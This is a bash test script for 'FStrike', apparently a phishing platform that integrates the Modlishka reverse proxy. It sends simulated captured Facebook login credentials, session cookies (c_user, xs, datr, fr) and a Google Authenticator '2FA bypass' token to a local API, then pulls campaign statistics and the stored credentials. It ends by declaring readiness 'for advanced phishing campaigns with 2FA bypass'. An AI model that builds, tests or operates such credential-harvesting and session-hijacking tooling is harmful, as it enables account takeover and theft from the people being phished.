#!/bin/bash

# FStrike Modlishka Integration Test Script
# This script demonstrates the advanced 2FA bypass and cookie capture capabilities

echo "🎣 FStrike Modlishka Integration Test"
echo "====================================="

# Test 1: Get active sessions
echo "📊 1. Getting active Modlishka sessions..."
curl -s http://localhost:5000/api/modlishka/sessions | jq '.'

echo ""
echo "🔐 2. Simulating credential capture..."

# Test 2: Simulate credential capture
curl -X POST http://localhost:5000/api/modlishka/credentials/1 \
  -H "Content-Type: application/json" \
  -d '{
    "type": "facebook_login",
    "email": "victim@target.com",
    "password": "captured_password123",
    "timestamp": "'$(date -Iseconds)'",
    "url": "https://facebook.com/login.php",
    "ip": "192.168.1.100"
  }'

echo ""
echo "🍪 3. Simulating cookie capture (session hijacking)..."

# Test 3: Simulate cookie capture with session cookies
curl -X POST http://localhost:5000/api/modlishka/cookies/1 \
  -H "Content-Type: application/json" \
  -d '{
    "cookies": [
      {"name": "c_user", "value": "100012345678901", "domain": "facebook.com"},
      {"name": "xs", "value": "12%3Aabcd1234%3A2%3A1234567890", "domain": "facebook.com"},
      {"name": "datr", "value": "abcd1234-efgh-5678-ijkl-mnop90123456", "domain": "facebook.com"},
      {"name": "fr", "value": "0987654321abcdef.AWVX1234567890", "domain": "facebook.com"}
    ],
    "timestamp": "'$(date -Iseconds)'",
    "url": "https://facebook.com/",
    "sessionCaptured": true
  }'

echo ""
echo "🔐 4. Simulating 2FA bypass capture..."

# Test 4: Simulate 2FA token capture
curl -X POST http://localhost:5000/api/modlishka/2fa/1 \
  -H "Content-Type: application/json" \
  -d '{
    "type": "totp_bypass",
    "token": "123456",
    "method": "google_authenticator",
    "timestamp": "'$(date -Iseconds)'",
    "bypassSuccessful": true,
    "sessionPersisted": true
  }'

echo ""
echo "📈 5. Getting updated campaign statistics..."

# Test 5: Get updated stats
curl -s http://localhost:5000/api/modlishka/campaigns/1/stats | jq '.'

echo ""
echo "🔍 6. Getting captured credentials..."

# Test 6: Get captured credentials
curl -s http://localhost:5000/api/modlishka/sessions/e1d708f46a508947c3259990180e14fd/credentials | jq '.'

echo ""
echo "✅ Modlishka integration test completed!"
echo "🎯 Ready for advanced phishing campaigns with 2FA bypass!"